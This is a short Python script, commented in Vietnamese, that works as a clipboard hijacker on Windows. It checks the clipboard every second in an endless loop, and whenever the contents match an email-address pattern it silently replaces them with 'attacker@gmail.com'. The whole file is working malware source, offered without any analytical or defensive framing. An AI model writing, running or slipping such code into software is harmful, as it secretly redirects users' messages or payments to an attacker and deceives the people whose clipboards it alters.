import win32clipboard, re
from time import sleep

attacker_email = "attacker@gmail.com"  # Email thay thế khi tìm thấy email hợp lệ trong clipboard
emailregex = '^[a-z0-9]+[\\._]?[a-z0-9]+[@][\\w]+[\\.][\\w]{2,3}$'  # Biểu thức chính quy kiểm tra email hợp lệ

while True:
    win32clipboard.OpenClipboard()  # Mở clipboard
    data = win32clipboard.GetClipboardData().rstrip()  # Lấy dữ liệu từ clipboard và loại bỏ khoảng trắng

    if (re.search(emailregex, data)):  # Kiểm tra nếu dữ liệu là email hợp lệ
        win32clipboard.EmptyClipboard()  # Xóa dữ liệu trong clipboard
        win32clipboard.SetClipboardText(attacker_email)  # Thay thế email bằng email của attacker

    win32clipboard.CloseClipboard()  # Đóng clipboard
    sleep(1)  # Chờ 1 giây trước khi kiểm tra lại
